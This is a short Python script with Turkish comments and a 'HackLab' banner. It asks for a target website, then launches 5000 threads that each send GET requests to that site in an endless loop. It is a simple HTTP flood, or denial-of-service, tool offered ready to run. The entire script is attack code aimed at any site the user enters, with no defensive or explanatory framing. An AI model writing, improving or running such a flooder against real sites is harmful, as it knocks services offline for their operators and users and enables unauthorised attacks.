import threading
import requests
import pyfiglet

# Büyük ASCII "HackLab" yazısı
ascii_banner = pyfiglet.figlet_format("HackLab")
print(ascii_banner)

# Kullanıcıdan hedef siteyi al
target_url = input("Hedef siteyi gir (http:// veya https:// ile): ")

# Aynı anda çalışacak istek sayısı
num_requests = 5000

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"[+] İstek gönderildi! Durum Kodu: {response.status_code}")
        except requests.exceptions.RequestException:
            print("[-] Hata! Sunucu cevap vermiyor.")

# Thread’leri başlat
threads = []
for _ in range(num_requests):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)

# Thread’lerin bitmesini bekle
for t in threads:
    t.join()